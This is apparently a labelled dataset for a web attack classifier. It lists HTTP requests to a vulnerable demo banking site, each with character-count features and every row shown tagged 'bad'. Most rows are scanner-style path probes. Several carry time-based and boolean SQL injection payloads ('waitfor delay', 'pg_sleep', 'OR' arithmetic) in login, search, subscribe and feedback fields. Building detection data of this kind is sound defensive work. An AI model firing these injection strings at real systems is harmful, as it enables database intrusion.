method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=%5c,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/%40%40I0vwe.html,,0,0,0,0,0,0,bad
GET,/status_check.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=%40%40guzdj&submit=Submit,0,0,0,0,2,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/search.jsp?query=Mcexw70p');%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=Submit,0,0,0,0,2,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1%c0%00xa7%c0%a2&submit=Submit,0,0,0,0,2,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/doLogin,btnSubmit=sEGrIs83'));select%20pg_sleep(6);%20--%20&passw=g00dPa%24%24w0rD&uid=1,1,0,1,1,3,3,bad
POST,/doSubscribe,btnSubmit=nRdEBgMG';%20waitfor%20delay%20'0:0:6'%20--%20&txtEmail=sample%40email.tst,3,0,1,0,5,2,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,3,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=gp4chlHw';select%20pg_sleep(6);%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,1,0,1,1,5,2,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=WdAlcaVG'));%20waitfor%20delay%20'0:0:3'%20--%20,3,0,1,0,5,2,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/images/gradient.jpg,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=P69RQtqR');%20waitfor%20delay%20'0:0:6'%20--%20&name=xmsktkqj&subject=1&submit=Submit,3,0,1,0,5,2,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/JyI%3d.htm,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1%20OR%202%2b591-591-1%3d0%2b0%2b0%2b1%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,0,0,1,0,6,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
